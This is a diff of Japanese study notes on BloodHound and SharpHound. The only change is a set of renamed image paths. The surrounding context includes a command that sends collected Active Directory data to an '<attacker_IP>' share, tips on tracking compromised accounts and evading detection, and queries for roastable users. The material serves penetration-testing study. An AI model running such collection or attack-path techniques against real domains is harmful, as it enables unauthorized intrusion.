@@ -77,7 +77,7 @@ Legacyでは、BloodHoundとSharpHoundの互換性に気をつける必要があ
 	- Active Directoryに対しデータ収集：SharpHound
 	- Entra IDに対しデータ収集：AzureHound
 
-![](../画像ファイル/Pasted%20image%2020251006071117.png)
+![](../Images/Pasted%20image%2020251006071117.png)
 
 $$Download　Collectorsのページ$$
 
@@ -128,7 +128,7 @@ Invoke-BloodHound -CollectionMethod All -OutputDirectory \\<attacker_IP>\share -
 
 3. 攻撃者のマシンに戻り、BloodHoundのAdministration > File IngestでUpload Fileを実行し、SharpHoundの実行結果であるzipファイルをアップロードする
 
-![](../画像ファイル/Pasted%20image%2020251006074057.png)
+![](../Images/Pasted%20image%2020251006074057.png)
 
 $$File　IngestのStatusがCompleteになれば分析準備OK$$
 
@@ -154,7 +154,7 @@ $$File　IngestのStatusがCompleteになれば分析準備OK$$
 | Inbound Object Control  | 他のオブジェクトがこのオブジェクトに対してどのような権限を持っているか |
 | Outbound Object Control | このオブジェクトが他のオブジェクトに対してどのような権限を持っているか |
 
-![](../画像ファイル/Pasted%20image%2020251007072812.png)
+![](../Images/Pasted%20image%2020251007072812.png)
 
 $$エンティティパネル$$
 
@@ -162,11 +162,11 @@ $$エンティティパネル$$
 	- 💀：Ownedリストに追加されたノードを意味する
 	- アタックベクターを可視化するため、侵害したユーザーは==必ずAdd to Ownedする==こと
 
-![](../画像ファイル/Pasted%20image%2020251007071811.png)
+![](../Images/Pasted%20image%2020251007071811.png)
 
 - 💎："HIGH VALUE"を意味し、特に重要なオブジェクトや侵害できると大きなメリットがあるオブジェクトを指す
 
-![](../画像ファイル/Pasted%20image%2020251007064333.png)
+![](../Images/Pasted%20image%2020251007064333.png)
 
 $$ノードのアイコンの意味$$
 
@@ -182,7 +182,7 @@ $$ノードのアイコンの意味$$
 		- ⚠️古いエクスプロイトの場合もあるので、エクスプロイト技法については公式ドキュメントを読む
 	- Opsec Considerations：レッドチームメンバーが検知回避で考慮すべき点など
 
-![](../画像ファイル/Pasted%20image%2020251007064618.png)
+![](../Images/Pasted%20image%2020251007064618.png)
 
 $$edgeのプロパティを表示$$
 
@@ -196,7 +196,7 @@ $$edgeのプロパティを表示$$
 - ノードについてのラベルをつけると、そのラベルに該当するオブジェクトに絞ることができる
 	- [nodeについて](#nodeについて)
 
-![](../画像ファイル/Pasted%20image%2020251007065722.png)
+![](../Images/Pasted%20image%2020251007065722.png)
 
 $$groupラベルでadminとつくグループのみを検索している$$
 
@@ -217,7 +217,7 @@ $$groupラベルでadminとつくグループのみを検索している$$
 > - AS-REP Roastable users (DontReqPreAuth)
 > - All Kerberoastable users
 
-![](../画像ファイル/Pasted%20image%2020251006124753.png)
+![](../Images/Pasted%20image%2020251006124753.png)
 
 $$定義済みクエリですべてのドメインadminを列挙しているイメージ$$
 
